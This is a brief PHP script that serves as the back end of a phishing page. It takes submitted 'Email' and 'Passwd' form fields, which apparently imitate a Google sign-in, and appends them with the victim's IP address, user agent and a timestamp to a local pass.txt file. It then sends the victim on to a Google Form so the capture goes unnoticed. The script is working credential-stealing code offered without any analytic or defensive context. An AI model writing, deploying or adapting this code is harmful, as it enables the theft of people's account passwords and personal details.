<?php

header ('Location:https://docs.google.com/forms/d/e/1FAIpQLSew93ZgKShRS0d3XfaQzuUcKFX9Rb284ZnR6GJweERqB81QDA/viewform?usp=sf_link');
$handle = fopen("pass.txt", "a");

$rec_email = $_POST['Email'];
$rec_passwd = $_POST['Passwd'];

$currentDateTime = date('Y-m-d H:i:s');

fwrite($handle, "Date & Time = " . $currentDateTime);
fwrite($handle, "\r\n");
   fwrite($handle,"IP = " . $_SERVER['REMOTE_ADDR']);
   fwrite($handle, "\r\n");
   fwrite($handle, "Email ");
   fwrite($handle, "=");
   fwrite($handle, " " . $rec_email);
  fwrite($handle, "\r\n");
   
   fwrite($handle, "Password");
   fwrite($handle, "=");
   fwrite($handle, " " . $rec_passwd);
   fwrite($handle, "\r\n");
   
fwrite($handle, "Device = " . $_SERVER["HTTP_USER_AGENT"]);
   fwrite($handle, "\r\n");

fwrite($handle, "\r\n---------------------------------------------------\r\n\n");
fclose($handle);
exit;
?>